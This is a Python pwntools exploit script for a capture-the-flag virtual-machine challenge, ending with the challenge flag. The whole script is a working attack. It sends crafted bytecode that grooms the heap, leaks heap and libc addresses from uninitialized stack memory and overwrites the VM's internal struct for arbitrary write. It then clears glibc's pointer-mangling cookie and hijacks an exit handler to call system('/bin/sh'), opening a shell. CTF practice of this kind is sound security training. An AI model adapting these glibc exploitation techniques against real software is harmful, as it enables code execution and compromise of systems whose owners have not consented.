#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

context.update(arch="amd64")
context.log_level = logging.DEBUG
context.terminal = ["tmux", "splitw", "-h", "-P"]
exe = "./vm_chall_patched"

host = args.HOST or "uninitialized_vm.eng.run"
port = int(args.PORT or 8923)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def round(p: bytes):
    io.sendlineafter("[ lEn? ] >> ", str(len(p)).encode())
    io.sendafter("[ BYTECODE ] >>", p)


def sub(dst: int, src: int) -> bytes:
    return b"\x44" + p8(dst) + p8(src)


def add(dst: int, src: int) -> bytes:
    return b"\x43" + p8(dst) + p8(src)


def mov(dst: int, src: int) -> bytes:
    return b"\x34" + p8(dst) + p8(src)


def shl(dst: int, src: int) -> bytes:
    return b"\x42" + p8(dst) + p8(src)


def pop(reg: int) -> bytes:
    return b"\x33" + p8(reg)


def push_reg(reg: int) -> bytes:
    return b"\x32" + p8(reg)


def push(val: int) -> bytes:
    return b"\x31" + p64(val)


def load(reg: int, val: int) -> bytes:
    return b"\x35" + p8(reg) + p64(val)


def memcpy(dst: int, src: int, size: int) -> bytes:
    return b"\x36" + p8(dst) + p8(src) + p16(size)


gdbscript = """
brva 0x1874
# brva 0x1879
continue
""".format(
    **locals()
)

io = start()

# grooming to get current vm allocated before a freed text + vm, where are the pointers
round(b" ")
round(b" ")

p = b""

# start by decreasing sp to be pop values after
for _ in range(18):
    p += load(0, 0)
    p += push_reg(0)

p += load(0, 0x100 - 0x18)
p += load(1, 0xFE)
p += memcpy(0, 1, 0x90 + 1)
round(p + b" ")


# heap ptr in the stack, load into r7
p = pop(7)
p += load(6, 0x000055830738EB98 - 0x55830738E000)
p += sub(7, 6)

for _ in range(9):
    p += pop(6)

# libc ptr in the stack, load into r6
p += pop(6)
p += load(5, 0x00007F9954366B20 - 0x7F9954180000)
p += sub(6, 5)
round(p + b" ")

# overwrite vm struct
# vm->ip overwrite with the same value
# vm->sp to where we want to get arb read/write

# overwrite PTR_MANGLE cookie
mangle_cookie_offset = 0x2890

p = b""

for _ in range(10):
    p += load(0, 0x4141414141414141)
    p += push_reg(0)

# push new sp = tls cookie
p += mov(0, 6)
p += load(1, mangle_cookie_offset)
p += sub(0, 1)
# push new bp = new sp
p += push_reg(0)
p += push_reg(0)

# push same ip
p += mov(0, 7)
p += load(1, 0x0000555B5B72136D - 0x555B5B721000)
p += add(0, 1)
p += push_reg(0)

# push heap chunk size
p += load(0, 0x61)
p += push_reg(0)

# overwrite vm struct
p += load(0, 0x100 - 0x18)
p += load(1, 0xFE)
p += memcpy(1, 0, (7 * 8) + 1)

# overwrite
p += load(2, 0)
p += push_reg(2)

round(p + b" ")

# overwrite initial.fns[0].func.cxa with system("/bin/sh")
cxa_offset = 0x7F2085D06020 - 0x7F2085B1E000

p = b""

for _ in range(16):
    p += load(0, 0x4242424242424242)
    p += push_reg(0)

round(p + b" ")

p = b""

# push new sp = initial func
p += mov(0, 6)
p += load(1, cxa_offset)
p += add(0, 1)
# push new bp = new sp
p += push_reg(0)
p += push_reg(0)

# push same ip
p += mov(0, 7)
p += load(1, 0x000055B2A9A622EB - 0x55B2A9A62000)
p += add(0, 1)
p += push_reg(0)

# push heap chunk size
p += load(0, 0x61)
p += push_reg(0)

p += load(0, 0x100 - 0x18)
p += load(1, 0xFE)
p += memcpy(1, 0, (7 * 8) + 1)

# overwrite arg
p += mov(0, 6)
p += load(1, (0x7F851B4B0F24 - 0x7F851B302000))
p += add(0, 1)
p += push_reg(0)

# overwrite func with mangled ptr
p += mov(0, 6)
p += load(1, (0x7F851B355400 - 0x7F851B302000))
p += add(0, 1)
p += load(1, 17)
p += shl(0, 1)
p += push_reg(0)

round(p)

io.interactive()

# bi0sctf{1ni7ia1i53_Cr4p70_pWn_N3x7_5$67?!@&86}
